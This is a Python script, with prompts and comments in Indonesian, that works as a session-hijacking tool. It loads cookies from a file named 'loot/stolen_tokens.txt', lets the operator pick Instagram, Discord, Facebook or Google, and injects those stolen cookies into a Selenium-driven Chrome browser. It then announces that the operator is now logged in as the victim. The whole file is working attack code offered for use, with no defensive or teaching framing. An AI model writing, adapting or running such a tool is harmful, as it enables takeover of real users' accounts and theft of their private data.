mport os
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

LOOT_FILE = "loot/stolen_tokens.txt"

# Target yang didukung dan domain loginnya

TARGET_SITES = {
    "1": ("Instagram", "https://www.instagram.com"),
    "2": ("Discord", "https://discord.com"),
    "3": ("Facebook", "https://www.facebook.com"),
    "4": ("Google", "https://www.google.com"),
}

def choose_target():
    print("\n[🎯] Pilih target untuk di inject:")
    for key, (name, _) in TARGET_SITES.items():
        print(f"[{key}] {name}")
    choice = input("Pilihan anda : ").strip()
    return TARGET_SITES.get(choice)

def load_cookies_for_domain(domain):
    cookies = []
    if not os.path.exists(LOOT_FILE):
        print("[!] tidak ada loot file yang ditemukan.")
        return cookies

    with open(LOOT_FILE, "r") as f:
        lines = f.readlines()
        for line in lines:
            if domain in line:
                try:
                    parts = line.strip().split("\t")
                    if len(parts) == 3:
                        cookie = {"domain": parts[0], "name": parts[1], "value": parts[2]}
                        cookies.append(cookie)
                except Exception as e:
                    print(f"[-] Gagal untuk parse: {line}")
    return cookies

def run():
    target = choose_target()
    if not target:
        print("[!] Pilihan tidak valid.")
        return

    name, url = target
    domain = url.replace("https://", "").replace("www.", "").strip("/")

    print(f"\n[🧪] Menjalankan browser untuk : {name}")
    cookies = load_cookies_for_domain(domain)
    if not cookies:
        print("[!] Tidak ada cookie yang ditemukan untuk domain ini.")
        return

    # Browser yang ditujukan untuk visual hijack
    options = Options()
    options.add_argument("--user-agent=Mozilla/5.0")
    driver = webdriver.Chrome(options=options)

    # muat base URL dan inject cookies
    driver.get(url)
    time.sleep(3)
    driver.delete_all_cookies()
    for cookie in cookies:
        try:
            driver.add_cookie({
                "name": cookie["name"],
                "value": cookie["value"],
                "domain": "." + domain,
                "path": "/"
            })
            print(f"[+] Injected cookie: {cookie['name']}")
        except Exception as e:
            print(f"[!] Error injecting cookie {cookie['name']}: {e}")

    print("\n[💉] Session cookies injected. Memuat ulang page sebagai victim...")

    print(f"[✅] Jika cookie valid, Anda sekarang {name}.")
    input("Tekan ENTER untuk keluar dari browser...")
    driver.quit()

if __name__ == "__main__":
    run()
